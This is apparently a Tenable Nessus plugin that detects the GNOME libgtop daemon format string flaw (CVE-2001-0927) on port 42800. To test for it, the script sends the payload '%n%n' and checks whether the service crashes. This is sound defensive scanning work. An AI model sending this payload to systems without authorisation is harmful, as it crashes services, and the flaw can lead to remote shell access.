#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(10812);
 script_version("$Revision: 1.18 $");
 script_cvs_date("$Date: 2016/10/27 15:03:54 $");

 script_cve_id("CVE-2001-0927");
 script_osvdb_id(13993);

 script_name(english:"GNOME libgtop Daemon Remote Format String");
 script_summary(english:"Crashes libgtop_daemon");

 script_set_attribute(attribute:"synopsis", value:
"The remote host is running an application that is vulnerable to a
format string attack.");
 script_set_attribute(attribute:"description", value:
"It seems that libgtop is/was running on this port and is vulnerable to
a format string attack which may allow an attacker to gain a shell on
this host (with the privileges of 'nobody').");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2001/Nov/223");
 script_set_attribute(attribute:"solution", value:"Upgrade to libgtop 1.0.13 or later.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_set_attribute(attribute:"vuln_publication_date", value:"2001/11/27");
 script_set_attribute(attribute:"plugin_publication_date", value:"2001/11/27");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2001-2016 Tenable Network Security, Inc.");
 script_family(english:"Gain a shell remotely");

 script_require_keys("Settings/ParanoidReport");    
 script_require_ports(42800);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = 42800;
if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
 send(socket:soc, data:string("%n%n\r\n"));
 close(soc);
 sleep(1);
 soc = open_sock_tcp(port);
 if(!soc)security_hole(port);
 }
}
